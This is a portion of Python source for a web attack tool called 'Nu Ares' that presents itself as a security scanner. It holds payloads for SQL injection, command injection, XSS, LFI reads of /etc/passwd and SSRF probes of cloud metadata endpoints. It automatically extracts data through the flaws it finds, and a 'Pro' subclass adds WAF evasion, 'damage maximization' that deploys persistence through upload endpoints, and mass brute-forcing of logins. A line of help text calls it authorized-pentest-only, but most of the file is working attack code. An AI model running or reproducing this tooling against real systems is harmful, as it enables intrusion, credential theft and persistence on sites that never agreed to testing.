    def add_node(self, node_id: str, node_type: str, target: str, data: Any = None):
        if self.graph:
            self.graph.add_node(node_id, type=node_type, target=target, data=data)

    def add_edge(self, from_id: str, to_id: str, label: str = ""):
        if self.graph:
            self.graph.add_edge(from_id, to_id, label=label)

    def get_paths(self) -> List[List[str]]:
        if not self.graph:
            return []

        paths = []
        sqli_nodes = [n for n, d in self.graph.nodes(data=True) if d.get('type') == 'sqli']
        login_nodes = [n for n, d in self.graph.nodes(data=True) if d.get('type') == 'login']

        for start in sqli_nodes:
            for end in login_nodes:
                try:
                    for path in nx.all_simple_paths(self.graph, start, end):
                        paths.append(path)
                except:
                    continue

        return paths

# ==================== Enhanced Detectors ====================
class EnhancedLFIDetector:
    """Enhanced Local File Inclusion detector"""

    async def check(self, url: str, param: str, method: str, requester) -> Tuple[bool, float, Dict]:
        files = [
            ("/etc/passwd", "root:x:0:0:"),
            ("/etc/hosts", "127.0.0.1"),
            ("/etc/issue", None)
        ]

        for file, indicator in files:
            payloads = [
                f"../../../../{file}",
                f"....//....//{file}",
                f"php://filter/convert.base64-encode/resource={file}"
            ]

            for payload in payloads:
                resp = await requester(url, method=method, params={param: payload})
                if resp:
                    if indicator and indicator in resp.text:
                        return True, 0.95, {"file": file, "payload": payload}
                    elif file == "/etc/issue" and any(k in resp.text for k in ["Ubuntu", "Debian", "Kali", "CentOS"]):
                        return True, 0.9, {"file": file, "payload": payload}

        return False, 0.0, {}

class EnhancedCMDDetector:
    """Enhanced Command Injection detector"""

    async def check(self, url: str, param: str, method: str, requester) -> Tuple[bool, float, Dict]:
        rand_str = str(random.randint(100000, 999999))
        echo_payload = f"; echo {rand_str}"

        resp = await requester(url, method=method, params={param: echo_payload})
        if resp and rand_str in resp.text:
            return True, 0.95, {"output": resp.text[:200], "payload": echo_payload}

        output_payloads = ["; ls", "| id", "&& whoami"]
        for payload in output_payloads:
            resp = await requester(url, method=method, params={param: payload})
            if resp and ("uid=" in resp.text or "bin" in resp.text or "root" in resp.text):
                return True, 0.9, {"output": resp.text[:200], "payload": payload}

        time_payloads = ["; sleep 5", "| sleep 5"]
        for payload in time_payloads:
            start = time.time()
            resp = await requester(url, method=method, params={param: payload})
            elapsed = time.time() - start
            if resp and elapsed > 4.5:
                return True, 0.85, {"delay": elapsed, "payload": payload}

        return False, 0.0, {}

class EnhancedXSSDetector:
    """Enhanced Cross-Site Scripting detector"""

    def __init__(self, requester, config, browser_pool):
        self.requester = requester
        self.config = config
        self.browser_pool = browser_pool

    async def check(self, url: str, param: str, method: str) -> Tuple[bool, float, Dict]:
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>"
        ]

        for payload in payloads:
            resp = await self.requester(url, method=method, params={param: payload})
            if resp:
                reflection_context = ContextAwarePayload.detect_reflection_point(resp.text, payload)
                if reflection_context != 'attribute':
                    return True, 0.85, {"reflected": True, "context": reflection_context, "payload": payload}

                if self.browser_pool:
                    executed, ev = await self._check_browser(url, param, payload, method)
                    if executed:
                        return True, 0.95, {"browser": ev, "payload": payload}

        return False, 0.0, {}

    async def _check_browser(self, url: str, param: str, payload: str, method: str) -> Tuple[bool, Dict]:
        ctx = await self.browser_pool.get_context()
        try:
            page = await ctx.new_page()
            parsed = urlparse(url)
            query = parse_qs(parsed.query)
            query[param] = [payload]
            new_query = urllib.parse.urlencode(query, doseq=True)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

            await page.add_script_tag(
                content="window.alert = function(msg) { window.__xss_alert = msg; };"
            )
            await page.goto(test_url, wait_until="domcontentloaded", timeout=5000)
            alert_msg = await page.evaluate("window.__xss_alert")
            await page.close()

            if alert_msg:
                return True, {"alert": alert_msg}
        except Exception as e:
            logger.debug(f"Browser XSS error: {e}")
        finally:
            await self.browser_pool.release_context(ctx)

        return False, {}

class EnhancedSSRFDetector:
    """Enhanced Server-Side Request Forgery detector"""

    CLOUD_METADATA_URLS = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.168.254/latest/meta-data/"
    ]

    async def check(self, url: str, param: str, method: str, requester) -> Tuple[bool, float, Dict]:
        for meta_url in self.CLOUD_METADATA_URLS:
            resp = await requester(url, method=method, params={param: meta_url})
            if resp:
                if any(indicator in resp.text for indicator in
                       ["instance-id", "ami-id", "local-hostname", "AccessKeyId"]):
                    return True, 0.95, {"ssrf_url": meta_url, "response": resp.text[:200]}
                if resp.status_code == 200 and len(resp.text) < 1000:
                    return True, 0.7, {"ssrf_url": meta_url, "response": resp.text[:200]}

        resp = await requester(url, method=method, params={param: "http://127.0.0.1"})
        if resp and resp.status_code != 400:
            return True, 0.6, {"ssrf_url": "http://127.0.0.1"}

        return False, 0.0, {}

class ContextAwarePayload:
    """Context-aware payload detection"""

    @staticmethod
    def detect_reflection_point(response_text: str, payload: str) -> str:
        if payload in response_text:
            soup = BeautifulSoup(response_text, BEAUTIFULSOUP_PARSER)
            scripts = soup.find_all('script')
            for script in scripts:
                if script.string and payload in script.string:
                    return 'js'

            for tag in soup.find_all():
                for attr, val in tag.attrs.items():
                    if isinstance(val, str) and payload in val:
                        return 'attribute'

            return 'html'
        return 'unknown'

# ==================== Reporter ====================
class Reporter:
    """Professional reporting with multiple formats"""

    def __init__(self, output_dir: str = "reports"):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)

    def generate_html(self, vulnerabilities: List[Vulnerability], target: str,
                      stats: Dict = None) -> str:
        severity_colors = {
            'CRITICAL': '#dc3545',
            'HIGH': '#fd7e14',
            'MEDIUM': '#ffc107',
            'LOW': '#17a2b8',
            'INFO': '#6c757d'
        }

        html = f"""<!DOCTYPE html>
<html><head>
<meta charset="utf-8">
<title>Nu Ares v{VERSION} Security Report</title>
<style>
body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;margin:0;padding:20px;background:#f5f5f5;}}
.container{{max-width:1200px;margin:0 auto;}}
.header{{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;padding:30px;border-radius:10px;margin-bottom:20px;}}
.header h1{{margin:0;font-size:2em;}}
.header p{{margin:5px 0;opacity:0.9;}}
.stats{{display:flex;gap:20px;margin-top:20px;}}
.stat{{background:rgba(255,255,255,0.2);padding:15px;border-radius:8px;text-align:center;}}
.stat-value{{font-size:2em;font-weight:bold;}}
.vuln{{background:white;border-radius:8px;padding:20px;margin-bottom:15px;box-shadow:0 2px 4px rgba(0,0,0,0.1);}}
.vuln-header{{display:flex;justify-content:space-between;align-items:center;margin-bottom:15px;}}
.severity{{padding:5px 15px;border-radius:20px;color:white;font-weight:bold;}}
.critical{{background:#dc3545;}}.high{{background:#fd7e14;}}
.medium{{background:#ffc107;color:#333;}}.low{{background:#17a2b8;}}
.info{{background:#6c757d;}}
.vuln-detail{{margin:10px 0;}}
.vuln-detail strong{{color:#333;}}
code{{background:#f8f9fa;padding:2px 6px;border-radius:4px;font-family:Consolas,monospace;}}
pre{{background:#f8f9fa;padding:15px;border-radius:8px;overflow-x:auto;}}
.footer{{text-align:center;color:#666;margin-top:30px;padding-top:20px;border-top:1px solid #ddd;}}
</style>
</head><body>
<div class="container">
<div class="header">
<h1>Nu Ares v{VERSION} Security Report</h1>
<p><strong>Target:</strong> {target}</p>
<p><strong>Scan Date:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
<p><strong>Scanner:</strong> Nu Ares Security Team</p>
"""

        if stats:
            html += '<div class="stats">'
            html += f'<div class="stat"><div class="stat-value">{stats.get("requests", 0)}</div>Requests</div>'
            html += f'<div class="stat"><div class="stat-value">{len(vulnerabilities)}</div>Vulnerabilities</div>'
            html += '</div>'

        html += '</div>'

        severities = {'CRITICAL': [], 'HIGH': [], 'MEDIUM': [], 'LOW': [], 'INFO': []}
        for v in vulnerabilities:
            sev = v.severity.upper()
            if sev in severities:
                severities[sev].append(v)

        for sev, vulns in severities.items():
            if not vulns:
                continue
            html += f'<h2>{sev} ({len(vulns)})</h2>'
            for v in vulns:
                html += f"""
<div class="vuln">
<div class="vuln-header">
<h3>{v.vulnerability_type}</h3>
<span class="severity {sev.lower()}">{v.severity}</span>
</div>
<div class="vuln-detail"><strong>URL:</strong> {v.target_url}</div>
<div class="vuln-detail"><strong>Parameter:</strong> {v.parameter}</div>
<div class="vuln-detail"><strong>Payload:</strong> <code>{self._escape_html(v.payload)}</code></div>
<div class="vuln-detail"><strong>Confidence:</strong> {v.confidence:.0%}</div>
<div class="vuln-detail"><strong>CVSS:</strong> {v.cvss_score:.1f}</div>
<div class="vuln-detail"><strong>Description:</strong> {v.description}</div>
"""
                if v.evidence:
                    html += f'<div class="vuln-detail"><strong>Evidence:</strong><pre>{self._escape_html(json.dumps(v.evidence, indent=2))}</pre></div>'
                if v.remediation:
                    html += f'<div class="vuln-detail"><strong>Remediation:</strong> {v.remediation}</div>'
                html += '</div>'

        html += """
<div class="footer">
<p>Generated by Nu Ares v{VERSION} - Professional Edition</p>
<p>Report generated: {timestamp}</p>
</div>
</div></body></html>
""".format(
            VERSION=VERSION,
            timestamp=datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        )

        filename = self.output_dir / f"report_{int(time.time())}.html"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html)

        logger.info(f"[Report] HTML saved: {filename}")
        return str(filename)

    def generate_json(self, vulnerabilities: List[Vulnerability], target: str,
                      stats: Dict = None) -> str:
        data = {
            "report_version": VERSION,
            "scanner": "Nu Ares",
            "target": target,
            "scan_date": datetime.now().isoformat(),
            "statistics": stats or {},
            "summary": {
                "total": len(vulnerabilities),
                "critical": sum(1 for v in vulnerabilities if v.severity.upper() == 'CRITICAL'),
                "high": sum(1 for v in vulnerabilities if v.severity.upper() == 'HIGH'),
                "medium": sum(1 for v in vulnerabilities if v.severity.upper() == 'MEDIUM'),
                "low": sum(1 for v in vulnerabilities if v.severity.upper() == 'LOW')
            },
            "vulnerabilities": []
        }

        for v in vulnerabilities:
            data["vulnerabilities"].append({
                "id": v.id,
                "type": v.vulnerability_type,
                "url": v.target_url,
                "parameter": v.parameter,
                "payload": v.payload,
                "severity": v.severity,
                "confidence": v.confidence,
                "cvss": v.cvss_score,
                "description": v.description,
                "evidence": v.evidence,
                "remediation": v.remediation,
                "references": v.references,
                "cwe": v.cwe_id,
                "verified": v.verified,
                "timestamp": datetime.fromtimestamp(v.timestamp).isoformat()
            })

        filename = self.output_dir / f"report_{int(time.time())}.json"
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)

        logger.info(f"[Report] JSON saved: {filename}")
        return str(filename)

    def generate_csv(self, vulnerabilities: List[Vulnerability]) -> str:
        import csv

        filename = self.output_dir / f"vulnerabilities_{int(time.time())}.csv"

        with open(filename, 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow([
                'ID', 'Type', 'URL', 'Parameter', 'Severity',
                'Confidence', 'CVSS', 'Payload', 'Description'
            ])

            for v in vulnerabilities:
                writer.writerow([
                    v.id,
                    v.vulnerability_type,
                    v.target_url,
                    v.parameter,
                    v.severity,
                    f"{v.confidence:.2%}",
                    v.cvss_score,
                    v.payload,
                    v.description
                ])

        logger.info(f"[Report] CSV saved: {filename}")
        return str(filename)

    def _escape_html(self, text: str) -> str:
        return (text
            .replace('&', '&amp;')
            .replace('<', '&lt;')
            .replace('>', '&gt;')
            .replace('"', '&quot;')
            .replace("'", '&#39;'))

# ==================== Main Scanner ====================
class NuAresScanner:
    """Main vulnerability scanner orchestrator"""

    def __init__(self, target_url: str, config: Config):
        self.target_url = target_url.rstrip('/')
        self.config = config
        self.safe_mode = bool(config.data.get('safe_mode', False))
        self.scope = StrictScopeController(config)
        self.scope.set_target(target_url)
        self.dedup = RequestDeduplicator()
        self.adaptive = AdaptiveEngine(config)
        self.db = AsyncDB(config.data['db_path'])
        self.browser_pool = BrowserContextPool(
            headless=config.data['headless_browser'],
            max_contexts=min(6, self.adaptive.get_concurrency()),
            user_agents=config.data['user_agents']
        )
        self.llm_cache = None
        self.waf_detector = WAFDetector(config)
        self.backend_detector = BackendDetector(config)
        self.shared_host_detector = SharedHostDetector(config)
        self.request_core = AsyncRequestCore(
            config, self.scope, self.dedup, self.adaptive, self.waf_detector
        )
        self.crawler = BrowserCrawler(self.browser_pool, config)
        self.js_intel = JSIntelligence()
        self.reporter = Reporter(config.data['reports_dir'])
        self.audit_logger = AuditLogger()
        self.graph = AttackGraph()
        self.priority_queue = PriorityQueue()
        self.sqli_detector = AdvancedSQLi(self._request, config)
        self.post_exploit = PostExploitation(self._request, config, self.browser_pool)
        self.lfi_detector = EnhancedLFIDetector()
        self.cmd_detector = EnhancedCMDDetector()
        self.xss_detector = EnhancedXSSDetector(self._request, config, self.browser_pool)
        self.ssrf_detector = EnhancedSSRFDetector()
        self.wp_scanner = WordPressScanner(config, self._request)

        self.endpoints: Dict[str, EndpointNode] = {}
        self.found_vulns: List[Vulnerability] = []
        self.lock = threading.Lock()
        self.stats = {
            'requests': 0, 'attacks': 0, 'start_time': time.time(),
            'vulns_found': 0, 'scanned_urls': 0
        }
        self.baselines: Dict = {}
        self.scan_id = hashlib.md5(f"{target_url}:{time.time()}".encode()).hexdigest()[:12]

    async def _probe(self, url: str) -> bool:
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(url, timeout=5) as r:
                    return r.status in (200, 301, 302)
        except:
            return False

    async def _request(self, url: str, method: str = "GET", **kwargs) -> Optional[ResponseAdapter]:
        self.stats['requests'] += 1

        if psutil.Process().memory_info().rss > self.config.data['memory_limit_mb'] * 1024 * 1024:
            logger.error(f"Memory limit exceeded ({self.config.data['memory_limit_mb']} MB)")
            return None

        if self.stats['requests'] > self.config.data['max_requests_total']:
            logger.warning(f"Max requests limit reached")
            return None

        if self.config.data['authorization'].get('log_all_requests', True):
            payload = kwargs.get('params') or kwargs.get('data') or {}
            self.audit_logger.log_request(self.target_url, method, url, str(payload)[:200])

        return await self.request_core.request(url, method, **kwargs)

    async def run(self):
        logger.info("=" * 60)
        logger.info(f"Nu Ares v{VERSION} - Professional Edition")
        logger.info(f"Target: {self.target_url}")
        logger.info(f"Scan ID: {self.scan_id}")
        logger.info("=" * 60)

        if "localhost" in self.target_url:
            ok = await self._probe(self.target_url)
            if not ok:
                alt = self.target_url.replace("localhost", "127.0.0.1")
                if await self._probe(alt):
                    logger.info(f"[Probe] Switching to {alt}")
                    self.target_url = alt
                    self.scope.set_target(self.target_url)
                else:
                    logger.error("[Probe] Target not reachable")
                    return

        await self.db.connect()
        await self.request_core._create_session()

        logger.info("[Detection] Running technology fingerprinting...")

        if self.config.data.get('detect_waf', True):
            waf_type = await self.waf_detector.detect(self._request, self.target_url)
            self.request_core.set_waf_level(self.waf_detector.get_level())
            logger.info(f"[WAF] Detected: {waf_type}")

        backend_info = await self.backend_detector.detect(self._request, self.target_url)
        if backend_info:
            logger.info(f"[Backend] {backend_info}")

        try:
            ip = socket.gethostbyname(urlparse(self.target_url).netloc)
            is_shared, domains = await self.shared_host_detector.detect(ip)
            if is_shared:
                logger.info(f"[Shared Host] {len(domains)} domains on {ip}")
        except:
            pass

        wp_info = await self.wp_scanner.scan(self.target_url)
        if wp_info:
            logger.info(f"[WordPress] {wp_info.get('version', 'unknown')} - {len(wp_info.get('plugins', []))} plugins")

        logger.info("[Recon] Browser crawling...")
        browser_endpoints, network_requests = await self.crawler.crawl(
            self.target_url, depth=self.config.data['max_depth']
        )

        for url, data in browser_endpoints.items():
            if url not in self.endpoints:
                node = EndpointNode(
                    url=url,
                    method=data.get('method', 'GET'),
                    params=[],
                    forms=data.get('forms', []),
                    js_files=data.get('js_files', [])
                )
                self.endpoints[url] = node

        logger.info("[Recon] Analyzing JavaScript files...")
        for url, node in list(self.endpoints.items()):
            for js in node.js_files:
                js_data = await self.js_intel.analyze_url(js, self._request)
                node.js_analysis = js_data
                for ep in js_data.get('endpoints', []):
                    if ep not in self.endpoints:
                        self.endpoints[ep] = EndpointNode(url=ep, method='GET', params=[], forms=[], js_files=[])

        await self._crawl(self.target_url, depth=self.config.data['max_depth'])
        logger.info(f"[Recon] Discovered {len(self.endpoints)} endpoints")

        await self._discover_api_endpoints()

        if self.config.data.get('export_endpoints', True):
            export_file = self.config.data.get('endpoints_export_file', 'endpoints.json')
            with open(export_file, 'w') as f:
                json.dump([ep for ep in self.endpoints.keys()], f, indent=2)
            logger.info(f"[Export] {len(self.endpoints)} endpoints saved")

        if "dvwa" in self.target_url:
            for path in self.config.data['wordlists'].get('dvwa_paths', []):
                full = urljoin(self.target_url, path)
                if full not in self.endpoints:
                    self.endpoints[full] = EndpointNode(url=full, method='GET', params=[], forms=[], js_files=[])

        self._score_endpoints()

        if not self.safe_mode:
            all_endpoints = []
            while not self.priority_queue.empty():
                all_endpoints.append(self.priority_queue.pop())

            logger.info(f"[Scan] Processing {len(all_endpoints)} endpoints")

            await self._discover_parameters(all_endpoints)

            await self._run_prioritized_scans(all_endpoints)

            if not self.safe_mode:
                await self._exploit_vulnerabilities()

        self._generate_report()

        await self.db.close()
        await self.browser_pool.close()
        await self.request_core.close()
        self.audit_logger.close()

        self._print_summary()

    async def _discover_api_endpoints(self):
        api_paths = self.config.data['wordlists'].get('api_paths', [])
        for path in api_paths:
            full_url = urljoin(self.target_url, path)
            if full_url in self.endpoints:
                continue
            resp = await self._request(full_url)
            if resp and resp.status_code != 404:
                self.endpoints[full_url] = EndpointNode(
                    url=full_url, method='GET', params=[], forms=[], js_files=[]
                )
                logger.info(f"[API] Discovered: {full_url}")

    def _score_endpoints(self):
        for url, node in self.endpoints.items():
            score = 1.0
            context = ContextClassifier.classify(url, node.forms, node.params)
            score += ContextClassifier.get_priority_boost(context)
            if node.forms:
                score += 5
            for param in node.params:
                if param.lower() in ['id', 'user', 'pass', 'email']:
                    score += 2
            node.score = score
            self.priority_queue.push(score, (url, node))

    async def _discover_parameters(self, endpoints: List):
        baselines = {}
        for url, node in endpoints:
            if any(url.endswith(ext) for ext in ['.js', '.css', '.png', '.jpg']):
                continue
            base_resp = await self._request(url)
            if base_resp:
                baselines[url] = {
                    'status': base_resp.status_code,
                    'length': len(base_resp.content)
                }

        for url, node in endpoints:
            if any(url.endswith(ext) for ext in ['.js', '.css', '.png', '.jpg']):
                continue
            base = baselines.get(url)
            if not base:
                continue
            for param in self.config.data['wordlists']['params']:
                if param in node.params:
                    continue
                resp = await self._request(url, params={param: 'test'})
                if resp and (resp.status_code != base['status'] or
                            abs(len(resp.content) - base['length']) > 0.1 * base['length']):
                    node.params.append(param)
                    logger.info(f"[Param] Discovered: {param} @ {url}")

    async def _run_prioritized_scans(self, endpoints: List):
        scan_queue = PriorityQueue()
        for url, node in endpoints:
            scan_queue.push(node.score, (url, node))

        tasks = []
        while not scan_queue.empty():
            url, node = scan_queue.pop()
            context = ContextClassifier.classify(url, node.forms, node.params)

            for param in node.params:
                tasks.append(self._test_sqli(url, param, node.method, context))
                tasks.append(self._test_xss(url, param, node.method, context))
                tasks.append(self._test_lfi(url, param, node.method, context))
                tasks.append(self._test_cmd(url, param, node.method, context))
                tasks.append(self._test_ssrf(url, param, node.method, context))

        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)

    async def _test_sqli(self, url: str, param: str, method: str, context: str):
        verified_methods = []
        confidences = []

        baseline = self.baselines.get((url, param))
        if baseline:
            for payload in ["' OR '1'='1", "' OR 1=1--"]:
                resp = await self._request(url, method=method, params={param: payload})
                if resp and SignatureDetector.has_sql_error(resp.text):
                    verified_methods.append(('error', 0.95))
                    confidences.append(0.95)
                    break

        is_boolean, conf_bool, _ = await self.sqli_detector.test_boolean(url, param, method)
        is_time, conf_time = await self.sqli_detector.test_time(url, param, method)
        is_union, conf_union = await self.sqli_detector.test_union(url, param, method)

        if is_boolean:
            verified_methods.append(('boolean', conf_bool))
            confidences.append(conf_bool)
        if is_time:
            verified_methods.append(('time', conf_time))
            confidences.append(conf_time)
        if is_union:
            verified_methods.append(('union', conf_union))
            confidences.append(conf_union)

        if len(verified_methods) >= 2:
            conf = min(1.0, max(confidences) + 0.05)
            self._report_vuln("SQL Injection", url, param, "multi_method", conf,
                            {"methods": [m for m, _ in verified_methods]})
        elif len(verified_methods) == 1:
            method_type, conf = verified_methods[0]
            self._report_vuln("SQL Injection", url, param, method_type, conf * 0.9,
                            {"method": method_type})

    async def _test_xss(self, url: str, param: str, method: str, context: str):
        is_vuln, conf, ev = await self.xss_detector.check(url, param, method)
        if is_vuln:
            self._report_vuln("XSS", url, param, ev.get('payload', ''), conf, ev)

    async def _test_lfi(self, url: str, param: str, method: str, context: str):
        is_vuln, conf, ev = await self.lfi_detector.check(url, param, method, self._request)
        if is_vuln:
            self._report_vuln("LFI", url, param, ev.get('payload', ''), conf, ev)

    async def _test_cmd(self, url: str, param: str, method: str, context: str):
        is_vuln, conf, ev = await self.cmd_detector.check(url, param, method, self._request)
        if is_vuln:
            self._report_vuln("Command Injection", url, param, ev.get('payload', ''), conf, ev)

    async def _test_ssrf(self, url: str, param: str, method: str, context: str):
        is_vuln, conf, ev = await self.ssrf_detector.check(url, param, method, self._request)
        if is_vuln:
            self._report_vuln("SSRF", url, param, ev.get('ssrf_url', ''), conf, ev)

    async def _exploit_vulnerabilities(self):
        for vuln in self.found_vulns:
            self.audit_logger.log_exploitation(
                vuln.target_url, vuln.vulnerability_type, vuln.parameter, False
            )

            if vuln.vulnerability_type.startswith("SQL Injection"):
                data = await self.post_exploit.extract_sqli_data(
                    vuln.target_url, vuln.parameter, "GET"
                )
                if data:
                    vuln.exploited_data = data
                    vuln.exploitation_proof = f"Data extracted: {data[:200]}"
                    logger.info(f"[!] SQLi exploited: {vuln.target_url}")

            elif vuln.vulnerability_type == "LFI":
                data = await self.post_exploit.extract_lfi_file(
                    vuln.target_url, vuln.parameter, "GET"
                )
                if data:
                    vuln.exploited_data = data
                    vuln.exploitation_proof = f"File read: {data[:200]}"
                    logger.info(f"[!] LFI exploited: {vuln.target_url}")

            elif vuln.vulnerability_type == "Command Injection":
                data = await self.post_exploit.extract_cmd_output(
                    vuln.target_url, vuln.parameter, "GET"
                )
                if data:
                    vuln.exploited_data = data
                    vuln.exploitation_proof = f"Command output: {data[:200]}"
                    logger.info(f"[!] CMD exploited: {vuln.target_url}")

    def _report_vuln(self, vuln_type: str, url: str, param: str, payload: str,
                    confidence: float, evidence: Dict):
        self.stats['vulns_found'] += 1

        severity = 'HIGH' if confidence > 0.9 else 'MEDIUM' if confidence > 0.7 else 'LOW'
        if vuln_type in ['SQL Injection', 'Command Injection'] and confidence > 0.9:
            severity = 'CRITICAL'

        vuln = Vulnerability(
            id=hashlib.md5(f"{url}:{param}:{vuln_type}".encode()).hexdigest(),
            target_url=url,
            vulnerability_type=vuln_type,
            parameter=param,
            payload=payload,
            confidence=confidence,
            severity=severity,
            description=f"{vuln_type} vulnerability on parameter {param}",
            evidence=evidence,
            timestamp=time.time(),
            cvss_score=9.0 if severity == 'CRITICAL' else 8.0 if severity == 'HIGH' else 6.0 if severity == 'MEDIUM' else 3.0,
            remediation=f"Sanitize and validate input for parameter {param}"
        )

        with self.lock:
            self.found_vulns.append(vuln)

        self.audit_logger.log_finding({
            'type': vuln_type,
            'url': url,
            'param': param,
            'severity': severity,
            'confidence': confidence
        })

        logger.info(f"[{severity}] {vuln_type} on {param} @ {url} (conf={confidence:.2f})")

    async def _crawl(self, url: str, depth: int, cur_depth: int = 0):
        if cur_depth > depth or url in self.endpoints:
            return

        try:
            resp = await self._request(url)
            if not resp:
                return

            soup = BeautifulSoup(resp.text, BEAUTIFULSOUP_PARSER)
            node = EndpointNode(url=url, method='GET', params=[], forms=[], js_files=[])
            self.endpoints[url] = node

            for a in soup.find_all('a', href=True):
                full = urljoin(url, a['href'])
                if full.startswith(self.target_url):
                    await self._crawl(full, depth, cur_depth + 1)

            for form in soup.find_all('form'):
                action = urljoin(url, form.get('action', ''))
                method = form.get('method', 'get').lower()
                inputs = [inp.get('name') for inp in form.find_all('input') if inp.get('name')]
                node.forms.append({'action': action, 'method': method, 'inputs': inputs})
                if action not in self.endpoints:
                    self.endpoints[action] = EndpointNode(
                        url=action, method=method.upper(), params=inputs, forms=[], js_files=[]
                    )

            for script in soup.find_all('script', src=True):
                node.js_files.append(urljoin(url, script['src']))

        except Exception as e:
            logger.debug(f"Crawl error: {e}")

    def _generate_report(self):
        stats = {
            'requests': self.stats['requests'],
            'vulnerabilities': len(self.found_vulns),
            'endpoints': len(self.endpoints),
            'duration': time.time() - self.stats['start_time']
        }

        html_file = self.reporter.generate_html(self.found_vulns, self.target_url, stats)
        json_file = self.reporter.generate_json(self.found_vulns, self.target_url, stats)
        csv_file = self.reporter.generate_csv(self.found_vulns)

        self.stats['report_html'] = html_file
        self.stats['report_json'] = json_file
        self.stats['report_csv'] = csv_file

    def _print_summary(self):
        duration = time.time() - self.stats['start_time']

        logger.info("=" * 60)
        logger.info("SCAN SUMMARY")
        logger.info("=" * 60)
        logger.info(f"Scan ID: {self.scan_id}")
        logger.info(f"Duration: {duration:.2f}s")
        logger.info(f"Requests: {self.stats['requests']}")
        logger.info(f"Endpoints: {len(self.endpoints)}")
        logger.info(f"Vulnerabilities: {len(self.found_vulns)}")

        severities = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0}
        for v in self.found_vulns:
            severities[v.severity.upper()] = severities.get(v.severity.upper(), 0) + 1

        for sev, count in severities.items():
            if count > 0:
                logger.info(f"  {sev}: {count}")

        logger.info(f"\nReports:")
        logger.info(f"  HTML: {self.stats.get('report_html', 'N/A')}")
        logger.info(f"  JSON: {self.stats.get('report_json', 'N/A')}")
        logger.info(f"  CSV: {self.stats.get('report_csv', 'N/A')}")
        logger.info("=" * 60)

# ==================== Enhanced Request Core ====================
class AsyncRequestCorePro(AsyncRequestCore):
    """Enhanced request core with sophisticated evasion"""
    
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.evasion_pro = AdvancedEvasionPro()

    async def request_with_evasion(self, url: str, method: str = "GET", payload: str = None, **kwargs) -> List[ResponseAdapter]:
        """Send request with multiple evasion techniques"""
        responses = []
        
        if payload:
            evasion_payloads = self.evasion_pro.apply_sophisticated_evasion(payload, self.waf_level)
        else:
            evasion_payloads = [None]
        
        for ev_payload in evasion_payloads:
            test_kwargs = kwargs.copy()
            if ev_payload:
                # Assume the first param key is the target parameter (simplified)
                if 'params' in test_kwargs and isinstance(test_kwargs['params'], dict):
                    param_key = next(iter(test_kwargs['params'].keys()))
                    test_kwargs['params'][param_key] = ev_payload
                elif 'data' in test_kwargs and isinstance(test_kwargs['data'], dict):
                    param_key = next(iter(test_kwargs['data'].keys()))
                    test_kwargs['data'][param_key] = ev_payload
                else:
                    test_kwargs['params'] = {'payload': ev_payload}
            
            resp = await self.request(url, method, **test_kwargs)
            if resp:
                responses.append(resp)
                
                # If successful evasion found, use it
                if resp.ok:
                    logger.info(f"[Evasion] Success with payload: {ev_payload[:50]}...")
                    break
        
        return responses

# ==================== Enhanced Main Scanner ====================
class NuAresScannerPro(NuAresScanner):
    """Enhanced scanner with all new capabilities"""
    
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.evasion_pro = AdvancedEvasionPro()
        self.damage_max = DamageMaximization(self._request)
        self.unauth_access = UnauthorizedAccess(self._request, self.browser_pool)
        # Override request core with pro version
        self.request_core = AsyncRequestCorePro(
            self.config, self.scope, self.dedup, self.adaptive, self.waf_detector
        )

    async def _run_damage_maximization(self):
        """Execute damage maximization routines"""
        if not self.config.data.get('damage_max', {}).get('persistence', False):
            return
            
        logger.info("[DAMAGE] Executing persistence deployment...")
        for endpoint in self.endpoints.values():
            if 'upload' in endpoint.url.lower():
                await self.damage_max.deploy_persistence(endpoint.url)

    async def _run_unauthorized_access(self):
        """Execute unauthorized access attempts"""
        if not self.config.data.get('unauth_access', {}).get('bruteforce', False):
            return
            
        logger.info("[ACCESS] Running mass bruteforce...")
        login_endpoints = [ep.url for ep in self.endpoints.values() 
                          if any(kw in ep.url.lower() for kw in ['login', 'admin', 'auth'])]
        
        successes = await self.unauth_access.mass_bruteforce(login_endpoints)
        for success in successes:
            logger.info(f"[ACCESS] SUCCESS: {success['url']} - {success['user']}:{success['pwd']}")

    async def run(self):
        """Enhanced main scan with all capabilities"""
        await super().run()
        
        # NEW: Execute damage maximization
        await self._run_damage_maximization()
        
        # NEW: Execute unauthorized access
        await self._run_unauthorized_access()
        
        logger.info("[COMPLETE] Enhanced scan with evasion, damage max, and unauthorized access complete")

# ==================== CLI Entry Point ====================
async def main_async():
    """Enhanced async main with new features"""
    parser = argparse.ArgumentParser(
        description=f"Nu Ares v{VERSION} - Professional Web Application Security Scanner (Enhanced)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
ENHANCED FEATURES:
  --evasion-pro     Enable sophisticated evasion techniques
  --damage-max      Enable damage maximization capabilities  
  --unauth-access   Enable unauthorized access features
  --persistence     Deploy persistence mechanisms (dangerous!)

WARNING: These features are for AUTHORIZED pentesting only!
        """
    )

    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-c", "--config", default="config.yaml", help="Config file")
    parser.add_argument("--cookies", help="Cookies (name=value; ...)")
    parser.add_argument("--safe-mode", action="store_true", help="Passive scanning only")
    parser.add_argument("--threads", type=int, help="Override thread count")
    parser.add_argument("--depth", type=int, help="Override crawl depth")
    parser.add_argument("-v", "--version", action="version", version=f"%(prog)s {VERSION}")
    
